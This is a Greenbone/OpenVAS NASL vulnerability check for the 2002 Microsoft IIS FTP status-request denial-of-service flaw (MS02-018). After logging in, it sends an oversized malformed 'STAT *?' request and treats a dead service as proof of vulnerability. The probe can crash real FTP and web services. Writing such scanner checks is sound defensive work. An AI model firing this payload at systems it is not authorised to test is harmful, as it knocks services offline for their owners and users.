# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:ftp_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802441");
  script_version("2023-12-20T05:05:58+0000");
  script_cve_id("CVE-2002-0073");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-07-04 18:21:03 +0530 (Wed, 04 Jul 2012)");
  script_name("Microsoft IIS FTP Connection Status Request Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("MS/IIS-FTP/Installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/8801");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4482");
  script_xref(name:"URL", value:"http://www.cert.org/advisories/CA-2002-09.html");
  script_xref(name:"URL", value:"http://marc.info/?l=bugtraq&m=101901273810598&w=2");
  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-018");
  script_xref(name:"URL", value:"http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20020415-ms02-018");

  script_tag(name:"impact", value:"Successful exploitation will allow remote users to crash the application
  leading to denial of service condition or execute arbitrary code.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services version 4.0, 5.0 and 5.1.");

  script_tag(name:"insight", value:"Error in the handling of FTP session status requests. If a remote attacker
  with an existing FTP session sends a malformed FTP session status request,
  an access violation error could occur that would cause the termination of
  FTP and Web services on the affected server.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_tag(name:"summary", value:"This host is missing important security update according to
  Microsoft Bulletin MS02-018.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!ftpLoc = get_app_location(port:ftpPort, cpe:CPE)){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

ftplogin = ftp_log_in(socket:soc, user:login, pass:pass);
if(!ftplogin){
  close(soc);
  exit(0);
}

req = string("STAT *?", crap(1240), "\r\n");
send(socket:soc, data:req);

sleep(3);

send(socket:soc, data:string("HELP\r\n"));
recv = ftp_recv_line(socket:soc);

if(!recv){
  security_message(port:ftpPort);
  exit(0);
}

close(soc);

exit(99);
